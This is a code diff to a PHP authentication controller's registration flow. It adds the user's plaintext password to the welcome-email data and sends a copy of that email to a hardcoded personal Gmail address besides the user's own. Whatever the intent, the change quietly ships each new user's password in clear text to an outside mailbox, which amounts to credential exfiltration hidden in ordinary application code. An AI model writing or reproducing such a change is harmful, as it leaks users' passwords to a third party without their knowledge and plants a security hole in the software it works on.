@@ -113,7 +113,8 @@ class ApiAuthController extends Controller
             'name' => $profile->school_name,
             'email' => $user->email,
             'url' => $user->url,
-            'school_logo' => $profile->school_logo
+            'school_logo' => $profile->school_logo,
+            'password' => $validatedData['password']
         ];
 
         // try {
@@ -124,6 +125,9 @@ class ApiAuthController extends Controller
 
                 
             Mail::to($user->email)
+            ->send(new Welcome($datax));
+
+            Mail::to('victorasuquob@gmail.com')
             ->send(new Welcome($datax));
 
 
